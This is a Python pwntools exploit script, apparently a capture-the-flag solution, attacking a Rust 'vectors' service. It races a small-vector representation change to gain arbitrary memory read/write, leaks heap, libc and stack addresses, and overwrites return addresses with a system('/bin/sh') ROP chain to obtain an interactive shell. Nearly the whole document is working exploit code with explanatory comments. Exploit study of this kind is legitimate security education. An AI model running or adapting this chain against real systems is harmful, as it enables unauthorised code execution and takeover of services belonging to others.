#!/usr/bin/env python2
from pwn import *

#prompt = "read/write/push/pop> " if '--live' not in sys.argv else "read/write/push> "
prompt = "read/write/push/pop> "

def read(p, i, j, debug=False):
    s1 = p.recvuntil(prompt)
    if debug:
        print s1
    p.sendline('read\n%d\n%d' % (i, j))
    r = r"vec\[\d*\]\[\d*\] == (\d*)\n"
    s2 = p.recvregex(r)
    if debug:
        print s2
    return int(re.findall(r, s2)[0], 10), s1

def write(p, i, j, x, repeat=1):
    #s = p.recvuntil(prompt)
    s = None
    data = ('write\n%d\n%d\n%d\n' % (i, j, x))*repeat
    print('writing %d bytes' % (len(data),))
    p.send(data)
    #os.write(p.stdin.fileno(), data)
    return s

def push(p, i, x):
    s = p.recvuntil(prompt)
    p.sendline('push\n%d\n%d' % (i, x))
    return s

def pop(p, i):
    s = p.recvuntil(prompt)
    p.sendline('pop\n%d' % (i))
    return s

def parse(s):
    r = '0x([0-9a-f]*), (\\d+), (\\d+)\n'
    ret = [(int(a, 16), int(b, 10), int(c, 10)) for (a, b, c) in re.findall(r, s)]
    #assert len(ret) == 10
    return ret

p1, p2, p3 = [None]*3
while True:
    try:
        try:
            while True:
                start_time = time.time()
                #localpath = './target/release/vectors'
                localpath = './prod/vectors'
                p1 = process(localpath) if '--live' not in sys.argv else remote('vectors.420blaze.in', 420)
                p2 = process(localpath) if '--live' not in sys.argv else remote('vectors.420blaze.in', 420)
                p3 = process(localpath) if '--live' not in sys.argv else remote('vectors.420blaze.in', 420)
                # more workers doesn't seem to increase success because pwntools will start the next loop iter on fault for some reason, but it was worth a try
                #workers = [process('./target/release/vectors') if '--live' not in sys.argv else remote('vectors.420blaze.in', 420) for _ in range(1)]
                workers = [p3]
                time_taken = time.time() - start_time
                print('Initialized racers in %f seconds' % (time_taken,))

                """ The smallvec's can be thought of as `struct { size_t length; size_t tag; union { size_t inline[32]; struct { size_t *data; size_t capacity } not_inline; } value; } v[10];` """

                """ Do a dummy push to v[1] (which'll be overwritten later) to leak &v[1].value.inline[0]/&v[1].value.not_inline.data """
                push(p3, 1, 0)
                s = push(p3, 1, 0)
                p3_v1 = parse(s)[1][0]
                print(hex(p3_v1))

                """ Make v[0]'s capacity 32, so that the next push to v[0] will trigger a heap allocation """
                for _ in range(32):
                    s = push(p1, 0, u64('A'*8))

                #s1 = write(p2, 0, 0, u64('C'*8), repeat=2731)
                #s1 = write(p2, 0, 0, u64('C'*8), repeat=2730)

                """
                Trigger a race condition between a p1 pushing (and changing the representation of v[0] from inline to not_inline) and p2 writing to v[0].value.inline[0]/v[0].value.not_inline.data
                p2 may die here if the heap allocation happens first, since it'll try to write to v[0].value.not_inline.data[0] (a heap address in p1), which isn't mapped in p2
                This may take a few tries, hence the try/while True/except IndexError until we win the race
                """
                s1 = write(p2, 0, 0, p3_v1-8*2, repeat=2730)
                s2 = push(p1, 0, u64('D'*8))

                """ If p2 successfully set v[0]'s backing store (v[0].value.not_inline.data) to p3's mapping of &v[1].length, a read in p1 will fault """
                tmp = read(p1, 0, 0)
                #print tmp[1]
                #print hex(tmp[0])
        except IndexError as e:
            print(repr(e))
            """ Since p1 faulted, we won the race, and v[0].value.not_inline.data[i] can be used to read/write ((size_t*)&v[1])[i] by p3 """
            write(p3, 0, 0, 32) # set v[1]'s capacity to 32
            push(p3, 1, u64('Z'*8)) # so that pushing to v[1] will trigger a heap allocation
            heapleak = read(p3, 0, 2)[0] # allowing us to leak the new heap allocation
            print(hex(heapleak), heapleak)

            write(p3, 0, 0, 2**64-1) # v[1].length = UINT_MAX
            write(p3, 0, 1, 0) # v[1].typetag = INLINE (to get mmap-relative writes to v[2] without needing a leak)
            write(p3, 0, 3, 2**64-1) # v[1].capacity = UINT_MAX

            def attempt_pwn(p, worker_index):
                for _ in range(64):
                    push(p, 2, u64('Y'*8))
                heapleak = read(p3, 1, 32+2, debug=True)[0] # make heapleak p-local

                """ Use p3 to forge v[2] for the worker p to use, to isolate p3 from faulting """
                write(p3, 1, 32+0, 2**64-1) # v[2].length = UINT_MAX
                write(p3, 1, 32+1, 1) # v[2].typetag = NOT_INLINE
                write(p3, 1, 32+3, 2**64-1) # v[2].capacity = UINT_MAX

                def dump(real_addr, n, haltstr=None, haltsuffix=None):
                    write(p3, 1, 32+2, real_addr) # v[2].value.not_inline.data = real_addr
                    #print(push(p, 5, 0))
                    #gdb.attach(p)
                    #p.interactive()
                    d = []
                    print 'starting dump at %016x' % (real_addr, )
                    for i in range(n):
                        d.append(read(p, 2, i, debug=False)[0])
                        if haltstr:
                            #print(repr(''.join(map(p64, d))))
                            if haltstr in ''.join(map(p64, d)):
                                return d
                        if haltsuffix:
                            if d[-1] & 0xfff == haltsuffix:
                                return d
                    return d

                def formatted_print(d):
                    buf = None
                    for i, x in enumerate(d):
                        if i % 8 == 0:
                            if buf:
                                print buf
                            buf = '%016x:\t' % (i,)
                        buf += '%016x ' %(x,)
                    if i % 8 != 0:
                        print buf

                """
                We know an address in the heap, which unfortunately doesn't seem to have libc pointers with Rust's use of the allocator (though I didn't try too much heap manipulation).
                Fortunately, libc is at a constant-ish offset from the heap, so we can just offset into it.
                """

                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6' if '--live' not in sys.argv else './libc_02ad2eb11b76c81da7fc43ffe958c14f.so.6')
                heap_base = heapleak&~(0xfffff)
                heap_mem = dump(heap_base, 16)
                formatted_print(heap_mem)
                try:
                    #libc_somewhere = (heap_mem[0]&~(0xfffff)) + 0x200000 + 0x70000 # this seems to work every 4-8 tries on Debian, low entropy ASLR?
                    #libc_somewhere = (heap_mem[0]&~(0xfffff)) + 0x200000 + (0x10000*worker_index)
                    #libc_somewhere = (heap_mem[0]&~(0xfffff)) + 0x110000*worker_index
                    libc_somewhere = (heap_mem[0]&~(0xfffff)) + 0x400000 + 0x70000 # this works much more reliably (1/2?), so the randomness was probably just from truncation
                    print('Attempting to leak libc at %016x' % libc_somewhere)
                    libc_somewhere_mem = dump(libc_somewhere, 32)
                    formatted_print(libc_somewhere_mem)
                    libc_where = list(libc.search(''.join((p64(x) for x in libc_somewhere_mem[:4]))))
                    print('Succeeded in dumping libc, %d possible locations' % (len(libc_where),))

                    """
                    Once we have a libc pointer, we can use the copy we know of to find the base. 
                    This could probably be done without an explicit copy of libc, since we could 
                    dump enough to fingerprint/walk backwards in the mapping, but this is faster.
                    """

                    libc_base = libc_somewhere - libc_where[0]
                except:
                    # we segfaulted or failed to find the right thing in libc, have the next worker handle it
                    return
                #libc_base_mem = dump(libc_base, 32)
                #formatted_print(libc_base_mem)
                """ We can find the stack from libc via libc's environ pointer """
                environ = dump(libc_base+libc.symbols.environ, 32)
                formatted_print(environ)
                #stack_mem = dump(environ[0]&~0xfff, 0x1000, haltstr='vectors')
                r"""
/ (fcn) sym.main 38
|   sym.main ();
|              ; DATA XREF from 0x0000784d (entry0)
|           0x000088d0      50             pushq %rax
|           0x000088d1      4889f0         movq %rsi, %rax
|           0x000088d4      4863d7         movslq %edi, %rdx
|           0x000088d7      488d0d02f5ff.  leaq sym.vectors::main::h78758d4fa0712f25, %rcx ; method.vectors::main.h78758d4fa0712f25 ; 0x7de0 ; "UAWAVAUATSH\x81\xec\b\x01"
|           0x000088de      48890c24       movq %rcx, (%rsp)
|           0x000088e2      488d3587a826.  leaq obj.vtable.0.llvm.9968566621307937651, %rsi ; 0x273170
|           0x000088e9      4889e7         movq %rsp, %rdi
|           0x000088ec      4889c1         movq %rax, %rcx
|           0x000088ef      e8fc490000     callq sub.signal_2f0        ; void signal(int sig, void *func)
|           0x000088f4      59             popq %rcx
\           0x000088f5      c3             retq

                We search for the return address from Rust's version of __libc_start_main (autonamed by r2 as signal_2f0 in the above paste) by searching the stack for its last 3 nybbles (which are unaffected by ASLR)
                """
                #haltsuffix = (0x404 if '--live' not in sys.argv else 0x8f4)
                haltsuffix = 0x8f4
                stack_mem = dump(environ[0]&~0xfff, 0x1000, haltstr='vectors', haltsuffix=haltsuffix)
                formatted_print(stack_mem)
                #gdb.attach(p3)
                for (i, word) in enumerate(stack_mem):
                    if (word & 0xfff) == haltsuffix:
                        print 'Return address candidate: %d, %016x' % (i, word,)
                        #write(p, 2, i, 0x41424344) # IP-control PoC

                        """ For each thing that could be the return address, overwrite it with a system("/bin/sh") ropchain """

                        context.clear(arch='amd64')
                        libc.address = libc_base
                        rop = ROP(libc)
                        rop.system(libc.search('/bin/sh').next())
                        print rop.dump()
                        ropstr = str(rop)
                        j = 0
                        while len(ropstr) > 0:
                            print u64(ropstr[:8])
                            write(p, 2, i+j, u64(ropstr[:8]))
                            j += 1
                            ropstr = ropstr[8:]
                        print j, ropstr

                p.sendline('return')
                p.interactive()

            #attempt_pwn(p3, 7)
            for i, worker in enumerate(workers):
                print('{b} Starting worker {i} {b}'.format(b='='*5, i=i))
                attempt_pwn(worker, i)
    except EOFError:
        pass
    #except PwnlibException:
    #    pass
